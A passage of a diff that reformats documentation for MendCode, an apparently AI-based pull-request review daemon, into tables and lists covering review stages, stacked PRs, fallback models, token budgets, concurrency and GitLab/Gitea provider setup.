 Taking a job over gives you its fix session: the job is paused with `control: user`, no automatic fix or push runs, a second
 take-over is refused with who holds it, and only the holder releases it (back to `pending`, resuming from its checkpoint). A round
@@ -778,34 +1063,49 @@ redone with a new fix session.
 Status: in the daemon. Each run plans its stages from its effective config and the change, and the decisions are kept on the job's
 checkpoint.
 
-`phases.mode`: `none` (no visible stages; the job still moves through its operational states), `fixed` (`phases.list` as given) or
-`dynamic` (default: discovery, analysis, corroboration, fix when enabled, validation, plus stages chosen from evidence:
-`migrations`, `security`, `contracts`, `stack`). Each added or skipped stage is recorded on the job with its reason ("`db/migrations/0042_users.sql` is a migration or schema path").
-A stage is instructions, never new tools or permissions; a list cannot remove the verify pass or the closing gate, and an invalid
-list falls back to the preset stages and says why. Validation is a deterministic gate: incomplete, unverified, a failing check or
-an open confirmed finding is never `done`.
+| `phases.mode` | Stages |
+|---|---|
+| `none` | No visible stages; the job still moves through its operational states. |
+| `fixed` | `phases.list` as given. |
+| `dynamic` | Default: discovery, analysis, corroboration, fix when enabled, validation, plus stages chosen from evidence: `migrations`, `security`, `contracts`, `stack`. |
+
+Each added or skipped stage is recorded on the job with its reason: "`db/migrations/0042_users.sql` is a migration or schema path".
+
+A stage is instructions, never new tools or permissions. A list cannot remove the verify pass or closing gate; an invalid list falls back to preset stages and says why.
+
+Validation is a deterministic gate: incomplete, unverified, a failing check or an open confirmed finding is never `done`.
 
 ### Stacked pull requests
 
 Status: in the daemon. Each poll builds the stack graph. A parent's new head revalidates its children (trigger `stack`). A child's
 run starts at its parent's head, and findings the parent already reported are left out.
 
-A PR whose base branch is another open PR's head branch is stacked on it; the graph comes from the provider's open PRs, never from
-commit ancestry. A child is reviewed on its own commits (from its parent's head), so the parent's changes are not reviewed twice. A
-parent update, rebase, retarget, merge or close marks the child and its descendants for revalidation; a finding the child shares
-with its parent (same path, code line, category and summary, wherever the line moved) is the parent's, and its fix belongs on the
-parent's branch. Findings keep their identity across new SHAs (moved, `needs-recheck` when their line changed, `deleted`). A cycle
-or an ambiguous parent is reported and the PR is reviewed against its base. MendCode never restacks: it says what to run
-(`gt restack` or `git rebase --onto …`) and which files would conflict.
+A PR whose base branch is another open PR's head branch is stacked on it. The graph comes from the provider's open PRs, never from commit ancestry.
+
+A child is reviewed on its own commits, from its parent's head, so the parent's changes are not reviewed twice.
+
+- A parent update, rebase, retarget, merge or close marks the child and its descendants for revalidation.
+- A finding shared with the parent (same path, code line, category and summary, wherever the line moved) is the parent's; its fix belongs on the parent's branch.
+- Findings keep their identity across new SHAs: moved, `needs-recheck` when their line changed, `deleted`.
+- A cycle or ambiguous parent is reported; the PR is reviewed against its base.
+
+MendCode never restacks. It says what to run (`gt restack` or `git rebase --onto …`) and which files would conflict.
 
 ### Fallback models
 
-`fallback_models` (base branch only, empty by default) lists models a review moves to when its own model fails with a provider error
-or is not available (`the model does not exist`, a server error). It never moves for a quota or a rate limit (`budget.on_quota`
-decides those, unchanged), a stalled turn, the token cap or a stopped turn. Each entry must be in the model list you allow and on the
-reviewer's own engine and provider; one that is not is skipped and the review details say why. The move happens before a session has
-answered anything, so no conversation changes model half way; the sessions after it start on the fallback. The review details then
-read `Model: reviewed by fallback model X after the reviewer's own model failed (…)`; a review that needed none says nothing.
+`fallback_models` lists models a review moves to when its own model fails with a provider error or is unavailable (`the model does not exist`, a server error). It is base branch only, empty by default.
+
+It never moves for:
+
+- A quota or rate limit: `budget.on_quota` decides those, unchanged.
+- A stalled turn.
+- The token cap or a stopped turn.
+
+Each entry must be in the model list you allow and on the reviewer's own engine and provider. An entry that is not is skipped, and the review details say why.
+
+The move happens before a session has answered anything, so no conversation changes model half way. Sessions after it start on the fallback.
+
+The review details read `Model: reviewed by fallback model X after the reviewer's own model failed (…)`. A review that needed none says nothing.
 
 ### Budgets, quotas and accounting
 
@@ -859,15 +1159,25 @@ tests) becomes a "Reviewer's note" in the summary and the review goes on to veri
 its tools read and search only and that summarized files are a complete way to review. A defect the first pass named that verification
 ruled out is listed in the summary as ruled out, never as a finding.
 
-Five limits are kept apart: `budget.tokens_per_pr` (MendCode's own cap per PR head, across review, verify, fix and resumed rounds;
-`null` is no internal cap), `budget.context_tokens` (one call, not a total), the provider's real quota, a rate limit, and the loop
-limits of the fix loop. Counted tokens are input not served from the provider's cache plus output; cached tokens are shown apart,
+#### Keep the limits separate
+
+| Limit | Scope |
+|---|---|
+| `budget.tokens_per_pr` | MendCode's own cap per PR head, across review, verify, fix and resumed rounds; `null` is no internal cap. |
+| `budget.context_tokens` | One call, not a total. |
+| Provider's real quota | The provider's allowance. |
+| Rate limit | The provider's request limit. |
+| Fix-loop limits | The loop limits of the fix loop. |
+
+Counted tokens are input not served from the provider's cache plus output; cached tokens are shown apart,
 never converted. At the cap a review stops resumably with its candidates kept (never dropped, never published as a complete
 review), and a resume verifies only those candidates, with no second review pass. A real quota waits for the reset the provider
 names (`on_quota: wait`, within `max_wait_minutes`) or stops (`on_quota: stop`); a rate limit backs off a few times. There is no
 third option: no other model, provider, API key or paid usage. Accounting (`<dir>/pr-review/accounting.json`) keeps every call's
 reported input, output and cache figures per PR head, purpose and attempt, across restarts; a call with no report is counted as
 unknown, never as zero.
+
+#### Account for interrupted calls
 
 A call that does not end normally is still accounted, with only what the source reported. A turn that fails, is cancelled or is
 stopped as stalled keeps the usage its engine reported before it ended (a Claude Code turn cut short reports its partial usage)
@@ -878,13 +1188,17 @@ usually stays unknown: it is shown as a call without a report, never as an estim
 
 ### Concurrency
 
-`prReview.concurrency` (`settings.set`, 1 to 4, default 2) is how many reviews or `@mendcode` commands this device runs at once,
-across every watched repository. It is a per-device setting, not a `review.yaml` key: the watch's queue is daemon-wide, so the
-value is this machine's capacity, while repository config applies per review (one repository could not set the limit for
-another). It is a machine setting, so a config bundle never carries it to another device, and a remote or peer client cannot set
-it. A change applies to the next start, without a restart. The background job scheduler shared with Dream, loops and workflows
-also caps how many run (2 in normal mode, 4 in high), so values above 2 take effect only there. `/pr watch-repo list`, the
-`pr_review` status and the `/reviews` page show the value ("running N of M at once").
+Set `prReview.concurrency` with `settings.set` to choose how many reviews or `@mendcode` commands this device runs at once across every watched repository: 1 to 4, default 2.
+
+This is a per-device setting, not a `review.yaml` key. The watch's queue is daemon-wide, so the value is this machine's capacity; repository config applies per review, and one repository cannot set another's limit.
+
+- A config bundle never carries this machine setting to another device.
+- A remote or peer client cannot set it.
+- A change applies to the next start, without a restart.
+
+The background job scheduler shared with Dream, loops and workflows also caps how many run: 2 in normal mode, 4 in high. Values above 2 take effect only there.
+
+`/pr watch-repo list`, the `pr_review` status and the `/reviews` page show the value: "running N of M at once".
 
 ### Performance of MendCode's own pull requests
 
@@ -908,12 +1222,20 @@ model cost is the table's text.
 
 ### Providers
 
-The daemon picks the forge from the checkout's `origin`: github.com through `gh`, as described above; gitlab.com, or a host whose name
-contains `gitlab`, through GitLab's adapter (`glab api`, with glab's own login: `glab auth login`, or `GITLAB_TOKEN` read by glab);
-codeberg.org, or a host whose name contains `gitea` or `forgejo`, through the Gitea / Forgejo adapter (REST `/api/v1`, the token read from `GITEA_TOKEN` at
-each call, never stored). A self-hosted instance on any other host is named in the checkout: `git config mendcode.forge gitlab`
-(or `gitea`), and, for an ssh remote or another web port or scheme, `git config mendcode.forgeUrl http://host:port`. MendCode never
-reads, prints or stores a forge token itself.
+The daemon picks the forge from the checkout's `origin`:
+
+| Host | Adapter and login |
+|---|---|
+| github.com | `gh`, as described above. |
+| gitlab.com, or a host whose name contains `gitlab` | GitLab's adapter: `glab api`, with glab's own login (`glab auth login`, or `GITLAB_TOKEN` read by glab). |
+| codeberg.org, or a host whose name contains `gitea` or `forgejo` | Gitea / Forgejo adapter: REST `/api/v1`, token read from `GITEA_TOKEN` at each call, never stored. |
+
+For a self-hosted instance on another host:
+
+1. Name the forge in the checkout with `git config mendcode.forge gitlab` (or `gitea`).
+2. For an ssh remote or another web port or scheme, set `git config mendcode.forgeUrl http://host:port`.
+
+MendCode never reads, prints or stores a forge token itself.
 
 On GitLab and Gitea the daemon runs the watch (the adapter lists the open PRs or MRs each poll; comments are read only on a PR
 updated since the last read), reviews and their posts (one summary note or review plus inline comments, with the same head and
